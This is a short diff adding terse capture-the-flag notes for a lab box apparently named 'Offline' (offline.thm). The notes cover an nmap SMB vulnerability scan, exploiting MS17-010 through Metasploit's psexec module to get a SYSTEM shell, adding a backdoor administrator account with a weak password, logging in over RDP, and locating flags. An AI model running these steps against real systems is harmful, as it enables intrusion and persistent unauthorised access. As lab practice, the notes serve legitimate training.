@@ -1,0 +1,23 @@
+Offline:
+there is a ton of services
+24 ports
+nmap -sC -sV -p445 offline.thm --script=smb-vuln*
+
+metasploit
+search ms17-010
+use windows/smb/ms17_010_psexec
+metasploit console
+shell
+
+meterpreter shell
+whoami
+nt authority\system
+net user larry bird /add
+net localgroup administrators larry /add
+xfreerdp /u:larry /p:bird /v:offline.thm /size:90%
+
+rdp/admin
+navigate to C:\Users\Administrator\king-server
+flag in C:\Users\Administrator\
+C:\Users\Administrator\king-server\king
+add username
